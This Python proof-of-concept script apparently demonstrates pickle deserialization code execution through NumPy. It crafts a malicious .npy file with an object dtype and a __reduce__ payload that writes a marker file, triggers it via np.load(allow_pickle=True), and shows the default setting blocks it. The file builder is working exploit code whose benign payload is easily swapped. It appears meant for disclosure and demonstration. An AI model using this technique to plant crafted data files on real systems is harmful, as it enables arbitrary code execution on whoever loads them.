import pickle
import struct
import numpy as np
import io
import os
import tempfile

# The 'descr': '|O' makes dtype.hasobject == True, which routes read_array()
# into the pickle.load() path at _format_impl.py line 838.

header_dict = b"{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"

# Pad header to 64-byte alignment (NPY format requirement)
# Total prefix = magic(6 bytes) + version(2 bytes) + header_length(2 bytes) = 10
prefix_len = 10
hlen = len(header_dict) + 1  # +1 for trailing newline
padlen = 64 - ((prefix_len + hlen) % 64)
if padlen == 64:
    padlen = 0
header = header_dict + b' ' * padlen + b'\n'

# Build the full NPY header: magic + version 1.0 + header_length + header
npy_header = b'\x93NUMPY\x01\x00' + struct.pack('<H', len(header)) + header

print(f"[*] Crafted NPY header ({len(npy_header)} bytes)")
print(f"    Header dict: {header_dict.decode()}")
print()

# ============================================================================
# Build the malicious pickle payload
# ============================================================================
# When pickle.load() deserializes an object with __reduce__, it calls the
# returned callable with the returned args. This is the standard pickle RCE
# vector — it's not NumPy-specific, but NumPy provides the routing to reach
# pickle.load() via the .npy format.
#
# SAFE PAYLOAD: We just write a marker file to prove execution happened.

MARKER_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "PICKLE_RCE_PROOF.txt"
)

class SafeExploit:
    """Benign exploit that writes a marker file to prove code execution."""
    def __reduce__(self):
        # This function will be called during pickle.load()
        return (
            _write_marker,
            (MARKER_FILE,)
        )

def _write_marker(path):
    """Write a proof-of-execution marker file."""
    with open(path, 'w') as f:
        f.write(
            "!! PICKLE RCE PROOF !!\n"
            "This file was created by pickle.load() during np.load().\n"
            "An attacker could have run ANY Python code here instead.\n"
            f"Timestamp: {__import__('datetime').datetime.now().isoformat()}\n"
        )
    return np.array(["pwned"], dtype=object)  # return valid array


# Pickle the exploit object as a numpy object array
exploit_array = np.array([SafeExploit()], dtype=object)
payload = pickle.dumps(exploit_array, protocol=4)

print(f"[*] Built pickle payload ({len(payload)} bytes)")
print()

malicious_npy = npy_header + payload

output_path = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "malicious_pickle_rce.npy"
)

with open(output_path, 'wb') as f:
    f.write(malicious_npy)

print(f"[*] Written malicious .npy file: {output_path}")
print(f"    Total size: {len(malicious_npy)} bytes")
print(f"    Header: {len(npy_header)} bytes | Payload: {len(payload)} bytes")
print()

# ============================================================================
# Load it with allow_pickle=True to trigger the exploit
# ============================================================================
print("=" * 70)
print("LOADING malicious .npy with allow_pickle=True ...")
print("=" * 70)
print()

# Clean up any previous marker
if os.path.exists(MARKER_FILE):
    os.remove(MARKER_FILE)

try:
    result = np.load(output_path, allow_pickle=True)
    print(f"[*] np.load() returned: {result}")
    print(f"    type: {type(result)}")
except Exception as e:
    print(f"[!] Exception: {type(e).__name__}: {e}")

print()

# Check if the marker file was created (proof of code execution)
if os.path.exists(MARKER_FILE):
    print("=" * 70)
    print("!! RCE CONFIRMED !!")
    print("=" * 70)
    print()
    print(f"Marker file created at: {MARKER_FILE}")
    print("Contents:")
    print("-" * 40)
    with open(MARKER_FILE, 'r') as f:
        print(f.read())
    print("-" * 40)
    print()
    print("pickle.load() executed arbitrary code during np.load().")
    print("No ASan, no fuzzer, no special build — just stock NumPy.")
else:
    print("[*] Marker file NOT created — exploit did not execute.")

print()

# ============================================================================
# Show that allow_pickle=False blocks it
# ============================================================================
print("=" * 70)
print("LOADING same file with allow_pickle=False (default) ...")
print("=" * 70)
print()

try:
    result = np.load(output_path, allow_pickle=False)
    print(f"[!] UNEXPECTED: np.load() succeeded: {result}")
except ValueError as e:
    print(f"[*] Blocked as expected: {e}")
except Exception as e:
    print(f"[*] Exception: {type(e).__name__}: {e}")

print()
print("Done. The default allow_pickle=False prevents the RCE.")
